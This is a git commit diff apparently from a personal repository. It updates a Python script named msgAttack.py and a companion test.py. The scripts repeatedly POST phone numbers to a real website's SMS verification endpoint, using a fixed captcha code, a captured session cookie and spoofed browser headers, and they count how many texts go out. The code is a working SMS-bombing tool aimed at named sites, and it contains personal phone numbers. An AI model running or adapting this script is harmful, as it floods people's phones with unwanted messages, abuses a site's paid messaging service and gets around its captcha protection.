1d570affd9c2312d9e3d96c1342f97a801c34396
yjy <1335823608@qq.com>
2016-09-11 10:57:30 +0800

    update

--- webServerTest/msgAttack.py
+++ webServerTest/msgAttack.py
@@ -31,25 +31,32 @@ def begin_connect():
 
 def test_start(phone):
     global SEND_NUM
-    test_data = {'phone': phone}
+    test_data = {'phone': phone, 'imgcode': 6720}
     test_data_encode = urllib.parse.urlencode(test_data)
     headers = {
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0',
-        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
+        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        'Cookie': 'ktime_20160611/www.langsspt.com=-2;\
+                    PHPSESSID=9bakfmel39fl6g0uv307bnpui2;\
+                    CNZZDATA1259850767=1547586482-1470885066-%7C1473557673',
+        'X-Requested-With': 'XMLHttpRequest'
     }
-    conn = http.HTTPConnection(SERVER_NAME)
-    conn.request("POST", URL, test_data_encode, headers)
-    res = conn.getresponse()
-    if res.status == 200:
-        res_body = res.read()
-        if "b'1'" == str(res_body):
-            SEND_NUM += 1
-            print(test_data_encode, '短信发送成功', SEND_NUM)
+    try:
+        conn = http.HTTPConnection(SERVER_NAME)
+        conn.request("POST", URL, test_data_encode, headers)
+        res = conn.getresponse()
+        if res.status == 200:
+            res_body = res.read()
+            if "b'1'" == str(res_body):
+                SEND_NUM += 1
+                print(test_data_encode, '短信发送成功', SEND_NUM)
+            else:
+                print(test_data_encode, '短信发送失败')
         else:
-            print(test_data_encode, '短信发送失败')
-    else:
-        print('status:', res.status)
-    conn.close()
+            print('status:', res.status)
+        conn.close()
+    except:
+        print('有条短信发送失败了')
 
 i = 0
 while i < 10:
--- webServerTest/test.py
+++ webServerTest/test.py
@@ -8,25 +8,28 @@ import math
 
 
 # 测试的服务器 + 端口 （有些大网站会认定你是攻击并且重置你的请求，比如baidu.com）
-# SERVER_NAME = "www.langsspt.com"
-SERVER_NAME = "www.zx195.com"
+SERVER_NAME = "www.langsspt.com"
+# SERVER_NAME = "www.zx195.com"
 # 访问的页面
-URL = '/'
+URL = '/index.php/Index/msgSend'
 # URL = '/index.php/Index/verify'
-
-SEND_NUM = 0
 
 
 def test_start():
-    # test_data = {'phone': 15858654523}
-    # test_data_encode = urllib.parse.urlencode(test_data)
-    # headers = {
-    #     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0',
-    #     'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
-    # }
+    test_data = {'phone': 15058126273, 'imgcode': 3995}
+    test_data_encode = urllib.parse.urlencode(test_data)
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (\
+                        KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36',
+        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        'Cookie': 'ktime_20160611/www.langsspt.com=-2;\
+                    PHPSESSID=9bakfmel39fl6g0uv307bnpui2;\
+                    CNZZDATA1259850767=1547586482-1470885066-%7C1473552259',
+        'X-Requested-With': 'XMLHttpRequest'
+    }
     conn = http.HTTPConnection(SERVER_NAME)
-    # conn.request("POST", URL, test_data_encode, headers)
-    conn.request("GET", URL)
+    conn.request("POST", URL, test_data_encode, headers)
+    # conn.request("GET", URL)
     res = conn.getresponse()
     if res.status == 200:
         res_body = res.read()
